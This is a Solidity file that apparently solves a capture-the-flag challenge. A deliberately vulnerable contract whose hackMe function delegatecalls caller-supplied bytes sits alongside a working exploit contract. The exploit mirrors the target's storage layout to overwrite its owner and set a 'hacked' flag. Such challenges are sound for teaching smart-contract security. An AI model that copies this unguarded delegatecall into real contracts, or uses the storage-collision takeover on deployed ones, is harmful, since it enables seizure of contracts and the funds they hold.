// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract D31eg4t3 {
    uint256 a = 12345;
    uint8 b = 32;
    string private d; // Super Secret data.
    uint32 private c; // Super Secret data.
    string private mot; // Super Secret data.
    address public owner;
    mapping(address => bool) public canYouHackMe;

    modifier onlyOwner() {
        require(false, "Not a Owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function hackMe(bytes calldata bites) public returns (bool, bytes memory) {
        (bool r, bytes memory msge) = address(msg.sender).delegatecall(bites);
        return (r, msge);
    }

    function hacked() public onlyOwner {
        canYouHackMe[msg.sender] = true;
    }
}

contract ExploitD31eg4t3 {
    uint256 a = 12345;
    uint8 b = 32;
    string private d; // Super Secret data.
    uint32 private c; // Super Secret data.
    string private mot; // Super Secret data.
    address public owner;
    mapping(address => bool) public canYouHackMe;

    D31eg4t3 public target;

    constructor(address _targetAddress) {
        target = D31eg4t3(_targetAddress);
    }

    function hackContract(address _hackerAddress) public {
        // Objective 1
        owner = _hackerAddress;
        // Objective 2
        canYouHackMe[_hackerAddress] = true;
    }

    function attack() external {
        (bool success, bytes memory data) = target.hackMe(
            abi.encodeWithSignature("hackContract(address)", msg.sender)
        );
        require(success, "Failed!!!");
    }
}
